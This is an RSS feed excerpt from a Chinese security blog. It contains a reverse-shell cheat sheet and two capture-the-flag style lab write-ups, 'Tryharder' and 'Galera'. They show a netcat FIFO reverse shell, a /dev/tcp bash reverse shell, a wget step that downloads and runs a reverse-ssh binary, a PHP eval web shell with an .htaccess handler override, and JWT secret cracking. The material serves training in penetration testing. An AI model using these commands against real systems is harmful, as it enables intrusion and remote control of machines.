+`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.218.148 4444 &gt; /tmp/f`
+
+## 生成shell
+`python -c 'import pty; pty.spawn('/bin/sh')'`
+`echo os.system('/bin/bash')`
+`/bin/sh -i`
+`script -qc /bin/bash /dev/null`
+`perl -e 'exec '/bin/sh';'`
+`perl: exec '/bin/sh';`
+`ruby: exec '/bin/sh'`
+`lua: os.execute('/bin/sh')`
+`IRB: exec '/bin/sh'`
+`vi: :!bash`
+`vi: :set shell=/bin/bash:shell`
+`nmap: !sh`
+
+
+## 反向ssh
+#### 在目标机上使用
+`wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh &amp;&amp; chmod +x /dev/shm/reverse-ssh`
+`/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2`。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/shell-xiang-guan.html</guid><pubDate>Tue, 08 Jul 2025 13:19:22 +0000</pubDate></item><item><title>Tryharder</title><link>https://dehua-rd.github.io/post/Tryharder.html</link><description># Tryharder
+
+&gt; 日期：2025-07-04 ｜ 作者：dehua ｜ 标签：hvm，jwt， LD_PRELOAD
+
+---
+
+## 信息收集阶段
+
+首先对目标进行端口扫描，发现开放的服务如下：
+
+```bash
+nmap -sCV -p- 192.168.218.185
+```
+
+```text
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
+|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
+|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
+80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+|_http-server-header: Apache/2.4.59 (Debian)
+|_http-title: 西溪湖科技 - 企业门户网站
+```
+
+---
+
+## 漏洞利用过程
+
+主页是一个静态页面，啥也干不了，看源码有发现 API 路径，像是 Base64 编码：
+
+&lt;img width='936' height='328' alt='Image' src='https://github.com/user-attachments/assets/77ea71a1-51a4-446f-8df3-e667d1ec09c1' /&gt;
+
+```bash
+echo 'NzQyMjE=' | base64 -d
+# 输出：74221
+```
+
+访问 `/74221/` 是一个登录页面，继续进行目录扫描：
+
+```bash
+gobuster dir -u http://192.168.218.185/74221/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html
+```
+
+```text
+/uploads              (Status: 301)
+/index.php            (Status: 200)
+/dashboard.php        (Status: 302)
+```
+
+登录账号：test  密码：123456
+
+&lt;img width='1840' height='939' alt='Image' src='https://github.com/user-attachments/assets/1927c67d-bbe8-458f-b453-4555f8d3f1d3' /&gt;
+
+
+
+登录后发现是 JWT 身份验证，抓取 token 后尝试使用 hashcat 破解：
+
+
+```bash
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+```
+
+```text
+候选密钥：jwtsecret123
+```
+
+&lt;img width='1919' height='616' alt='Image' src='https://github.com/user-attachments/assets/2b10dfd8-cd8e-401f-94b6-534779f627ec' /&gt;
+
+&lt;img width='1915' height='608' alt='Image' src='https://github.com/user-attachments/assets/9709ab51-e289-43e3-86c9-b35abafe7c5d' /&gt;
+
+忘截图了，上面token中的sub是上传目录把123改成999，不然可能上传不成功
+使用伪造 token 后页面出现上传功能，上传如下两个文件：
+
+**shell.png**
+
+```php
+&lt;?php @eval($_POST['cmd']); ?&gt;
+```
+
+**.htaccess**
+
+```apache
+&lt;IfModule mime_module&gt;
+	AddHandler php5-script .png
+	SetHandler application/x-httpd-php
+&lt;/IfModule&gt;
+```
+
+访问 payload 后执行：
+
+&lt;img width='917' height='111' alt='Image' src='https://github.com/user-attachments/assets/86155986-3b43-4b84-abfa-48ab9d8936e5' /&gt;
+
+```php
+cmd=system('/usr/bin/bash -c '/usr/bin/bash -i &gt;&amp;/dev/tcp/192.168.218.148/1234 0&gt;&amp;1'');
+```
+
+&lt;img width='924' height='221' alt='Image' src='https://github.com/user-attachments/assets/63182291-07e6-4fc7-84e8-416ef9c24fe1' /&gt;
+
+## 权限提升分析
+
+在 pentester 用户主目录中找到 `.note` 文件，结合 `/etc/passwd` 中的信息
+但是我是想了很久也不知道这在提示什么，还是GPT好使，GPT告诉我可能与加密，隐写，凯撒密码这些有关，然后我开始对照这些语句的原文开始猜测，然后又浪费了很多时间，也没解出来，最后看了佬的wp，原来是找隐藏文件
+
+```bash
+find / -name '.*' 2&gt;/dev/null | grep -v sys
+```
+先看/srv
+```bash
+www-data@Tryharder:/srv$ cat ...
+Iuwbtthfbetuoftimfs'iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
+```
+看着跟passwd中的提示很像，可能是移位密码
+再看看secret中的提示
+```bash
+www-data@Tryharder:/var/backups/.secret/.verysecret/.noooooo$ cat note2.txt 
+```
+
+问了一手gpt：
+•	方法 1：第一段 = 第二段 + 固定位移（如凯撒 +5）。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/Tryharder.html</guid><pubDate>Sat, 05 Jul 2025 07:07:38 +0000</pubDate></item><item><title>galera</title><link>https://dehua-rd.github.io/post/galera.html</link><description># Galera HVM
+
+&gt; 日期：2025-07-02 ｜ 作者：dehua ｜ 标签：第一个wp博客，有什么改进的可以留下评论
+
+---
+
+## 信息收集阶段
+
+首先对目标进行端口扫描，发现开放的服务如下：
+
+```bash
+nmap -sC -sV -A 192.168.1.100
+```
+
+```
+22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
+| ssh-hostkey:
+| 256 28:50:32:2f:bb:ef:7e:51:c3:59:cb:e6:40:88:0e:4e (ECDSA)
+|_256 f3:fa:a1:84:c6:da:fc:09:fe:aa:ca:ec:0a:29:7d:30 (ED25519)
+80/tcp open http Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Login
+4567/tcp open tram?
+```
+
+---
+
+## 漏洞利用过程
+
+发现 80 端口是一个登录页面，进行目录扫描：
+
+```bash
+gobuster dir -u http://192.168.218.181/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html
+```
+
+```
+/login.php (Status: 302) [--&gt; /]
+/logout.php (Status: 302) [--&gt; index.php]
+/config.php (Status: 200)
+/upload (Status: 301) [--&gt; /upload/]
+/private.php (Status: 403)
+/info.php (Status: 200)
+/index.php (Status: 200)
+/server-status (Status: 403)
+```
+
+&gt; 发现一个 `info.php` 页面，是标准的 PHP 配置信息页面；其他页面基本无用。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/galera.html</guid><pubDate>Wed, 02 Jul 2025 15:05:57 +0000</pubDate></item></channel></rss>
